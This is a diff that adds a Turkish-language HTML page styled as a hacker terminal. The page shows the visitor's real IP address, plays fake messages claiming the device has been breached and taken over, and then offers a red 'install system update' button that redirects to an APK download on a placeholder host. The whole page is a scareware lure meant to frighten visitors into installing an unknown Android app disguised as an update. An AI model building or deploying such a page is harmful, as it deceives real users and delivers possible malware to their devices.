@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<title>SİSTEM İHLALİ</title>
+<style>
+  body {
+    margin: 0;
+    background: black;
+    color: #00ff00;
+    font-family: monospace;
+  }
+  #text {
+    padding: 10px;
+    white-space: pre-line;
+  }
+  #btn {
+    display: none;
+    margin: 20px;
+    padding: 15px;
+    background: red;
+    color: white;
+    border: none;
+    font-size: 16px;
+  }
+</style>
+</head>
+<body>
+
+<div id="text"></div>
+<button id="btn">SİSTEM GÜNCELLEMESİNİ YÜKLE</button>
+
+<script>
+// yazı ekleme
+function yaz(t) {
+  document.getElementById("text").innerHTML += t + "\n";
+}
+
+// IP göster
+fetch("https://api.ipify.org?format=json")
+  .then(r => r.json())
+  .then(d => yaz("IP adresi bulundu: " + d.ip));
+
+// mesajlar
+const mesajlar = [
+  "Sistem erişimi sağlandı...",
+  "Veriler analiz ediliyor...",
+  "Cihaz kontrolü ele geçirildi...",
+  "Zorunlu sistem güncellemesi gerekli!"
+];
+
+let i = 0;
+function akıs() {
+  if (i < mesajlar.length) {
+    yaz(mesajlar[i]);
+    i++;
+    setTimeout(akıs, 1200);
+  } else {
+    document.getElementById("btn").style.display = "block";
+  }
+}
+akıs();
+
+// BUTON → APK indir
+document.getElementById("btn").onclick = () => {
+  yaz("Güncelleme indiriliyor...");
+
+  setTimeout(() => {
+    window.location.href = "https://seninsite.com/app.apk";
+  }, 1500);
+};
+</script>
+
+</body>
+</html>
